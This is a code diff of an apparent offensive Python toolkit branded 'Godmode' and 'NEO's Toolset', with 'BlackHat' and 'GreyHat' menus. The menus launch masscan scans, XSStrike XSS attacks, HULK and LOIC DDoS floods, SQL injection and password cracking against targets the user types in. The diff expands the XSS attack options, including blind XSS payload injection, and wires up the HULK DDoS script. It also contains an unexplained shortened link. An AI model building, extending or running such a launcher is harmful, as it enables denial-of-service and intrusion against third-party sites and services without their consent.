@@ -38,14 +38,50 @@ def stealthy_port_scanner(target_ip):
     subprocess.run(["masscan", "--open", "-p1-65535", "--rate", "1000", target_ip])
 
 # Function to perform XSS attack using XSStrike
-def xss_attack(target_url):
+def xss_attack(target_url, options):
+    command = ["python3", "modules/XSstrike/xsstrike.py", "-u", target_url]
+    if options.get('proxy'):
+        command.append("--proxy")
+    if options.get('data'):
+        command.extend(["--data", options['data']])
+    if options.get('encode'):
+        command.extend(["--encode", options['encode']])
+    if options.get('fuzzer'):
+        command.append("--fuzzer")
+    if options.get('timeout'):
+        command.extend(["--timeout", options['timeout']])
+    if options.get('crawl'):
+        command.append("--crawl")
+    if options.get('json'):
+        command.append("--json")
+    if options.get('path'):
+        command.append("--path")
+    if options.get('seeds'):
+        command.extend(["--seeds", options['seeds']])
+    if options.get('file'):
+        command.extend(["-f", options['file']])
+    if options.get('level'):
+        command.extend(["-l", options['level']])
+    if options.get('headers'):
+        command.extend(["--headers", options['headers']])
+    if options.get('threads'):
+        command.extend(["-t", options['threads']])
+    if options.get('delay'):
+        command.extend(["-d", options['delay']])
+    if options.get('skip'):
+        command.append("--skip")
+    if options.get('skip_dom'):
+        command.append("--skip-dom")
+    if options.get('blind'):
+        command.append("--blind")
+
     print(f"\n{Fore.YELLOW}Performing XSS Attack on {target_url}...")
-    subprocess.run(["python3", "modules/xss_attack/xssattack.py", "-u", target_url])
+    subprocess.run(command)
 
 # Function to execute an advanced DDoS attack using HULK
 def advanced_ddos_attack(target_url):
     print(f"\n{Fore.YELLOW}Launching Advanced DDoS Attack on {target_url}...")
-    subprocess.run(["python3", "", "-site", target_url])
+    subprocess.run(["python3", "HULK/hulk.py", "-site", target_url])
 
 # Function to execute a DDoS attack using LOIC (Low Orbit Ion Cannon)
 def ddos_attack(target_url):
@@ -93,11 +129,17 @@ def sql_injection(target_url):
 
 # Function to display the main menu
 def display_main_menu():
-    print(f"\n{Fore.CYAN}=== NEO's Toolset ===")
-    print("Choose your path:")
-    print(f"{Fore.MAGENTA}1. Black Hat Operations")
-    print(f"{Fore.BLUE}2. Grey Hat Operations")
-    print(f"{Fore.RED}3. Exit{Style.RESET_ALL}")
+    clear_console()
+    print(f"{Fore.LIGHTYELLOW_EX}" + "⌠" + "═" * 38 + "⌡")
+    print(f" Program        Godmode v1.0")
+    print(f" Team           NEO")
+    print(f" Developer      ShowingTruth")
+    print(f" Link           https://tinyurl.com/yxzw4749")
+    print(f"⌠" + "═" * 38 + "⌡")
+    print(f"{Fore.RED} [ 1 ] BlackHat || v1.0")
+    print(f"{Fore.WHITE} [ 2 ] GreyHat || v1.0")
+    print(f"{Fore.GREEN} [ 3 ] TOOLS || Exit{Style.RESET_ALL}")
+    print(f"{Fore.GREEN} [ 4 ] TOOLS || Balance")
 
 # Function to display the Black Hat operations menu
 def display_black_hat_menu():
@@ -136,6 +178,7 @@ def display_grey_hat_menu():
 
 # Main function to manage user interaction
 def main():
+    clear_console()
     while True:
         display_main_menu()
         choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")
@@ -150,7 +193,34 @@ def main():
                     stealthy_port_scanner(target_ip)
                 elif choice == "2":
                     target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
-                    xss_attack(target_url)
+
+                    options = {}
+                    use_proxy = input(f"{Fore.MAGENTA}Use proxy? (y/n): {Style.RESET_ALL}").strip().lower()
+                    if use_proxy == 'y':
+                        options['proxy'] = True
+
+                    # Ask for additional options if needed
+                    if input(f"{Fore.MAGENTA}Do you want to specify additional options? (y/n): {Style.RESET_ALL}").strip().lower() == 'y':
+                        options['data'] = input(f"{Fore.MAGENTA}Enter post data (if any): {Style.RESET_ALL}")
+                        options['encode'] = input(f"{Fore.MAGENTA}Encode payloads? (y/n): {Style.RESET_ALL}").strip().lower()
+                        if options['encode'] == 'y':
+                            options['encode'] = input(f"{Fore.MAGENTA}Enter encode method: {Style.RESET_ALL}")
+                        options['fuzzer'] = input(f"{Fore.MAGENTA}Use fuzzer? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['timeout'] = input(f"{Fore.MAGENTA}Enter timeout (if any): {Style.RESET_ALL}")
+                        options['crawl'] = input(f"{Fore.MAGENTA}Enable crawling? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['json'] = input(f"{Fore.MAGENTA}Treat post data as json? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['path'] = input(f"{Fore.MAGENTA}Inject payloads in the path? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['seeds'] = input(f"{Fore.MAGENTA}Load crawling seeds from a file (if any): {Style.RESET_ALL}")
+                        options['file'] = input(f"{Fore.MAGENTA}Load payloads from a file (if any): {Style.RESET_ALL}")
+                        options['level'] = input(f"{Fore.MAGENTA}Level of crawling: {Style.RESET_ALL}")
+                        options['headers'] = input(f"{Fore.MAGENTA}Add headers (if any): {Style.RESET_ALL}")
+                        options['threads'] = input(f"{Fore.MAGENTA}Number of threads: {Style.RESET_ALL}")
+                        options['delay'] = input(f"{Fore.MAGENTA}Delay between requests (if any): {Style.RESET_ALL}")
+                        options['skip'] = input(f"{Fore.MAGENTA}Skip asking to continue? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['skip_dom'] = input(f"{Fore.MAGENTA}Skip DOM checking? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+                        options['blind'] = input(f"{Fore.MAGENTA}Inject blind XSS payload while crawling? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
+
+                    xss_attack(target_url, options)
                 elif choice == "3":
                     target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                     advanced_ddos_attack(target_url)
@@ -164,69 +234,7 @@ def main():
                     break
                 else:
                     print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
-def main():
-    while True:
-        display_main_menu()
-        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")
-
-        if choice == "1":  # Black Hat Operations
-            while True:
-                display_black_hat_menu()
-                choice = input(f"{Fore.MAGENTA}Enter your choice: {Style.RESET_ALL}")
-
-                if choice == "1":
-                    target_ip = input(f"{Fore.MAGENTA}Enter target IP address: {Style.RESET_ALL}")
-                    stealthy_port_scanner(target_ip)
-                elif choice == "2":
-                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
-                    xss_attack(target_url)
-                elif choice == "3":
-                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
-                    advanced_ddos_attack(target_url)
-                    input("\nPress Enter to continue...")
-                elif choice == "4":
-                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
-                    ddos_attack(target_url)
-                    input("\nPress Enter to continue...")
-                elif choice == "5":
-                    hash_file = input(f"{Fore.MAGENTA}Enter path to hash file: {Style.RESET_ALL}")
-                    advanced_password_cracker(hash_file)
-                elif choice == "6":
-                    break
-                else:
-                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
-
-        elif choice == "2":  # Grey Hat Operations
-            while True:
-                display_grey_hat_menu()
-                choice = input(f"{Fore.BLUE}Enter your choice: {Style.RESET_ALL}")
-
-                if choice == "1":
-                    target_ip = input(f"{Fore.BLUE}Enter target IP address: {Style.RESET_ALL}")
-                    stealthy_port_scanner(target_ip)
-                elif choice == "2":
-                    target_url = input(f"{Fore.BLUE}Enter target URL: {Style.RESET_ALL}")
-                    xss_attack(target_url)
-                elif choice == "3":
-                    target_url = input(f"{Fore.BLUE}Enter target URL: {Style.RESET_ALL}")
-                    advanced_ddos_attack(target_url)
-                    input("\nPress Enter to continue...")
-                elif choice == "4":
-                    hash_file = input(f"{Fore.BLUE}Enter path to hash file: {Style.RESET_ALL}")
-                    advanced_password_cracker(hash_file)
-                elif choice == "5":
-                    break
-                else:
-                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
-
-        elif choice == "3":  # Exit
-            print(f"\n{Fore.YELLOW}Exiting NEO's Toolset. You are no longer invulnerable. Stay safe!\n")
-            pause_and_countdown()
-            clear_console()
-            break
-
-        else:
-            print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
+                    clear_console()
 
 if __name__ == "__main__":
     main()
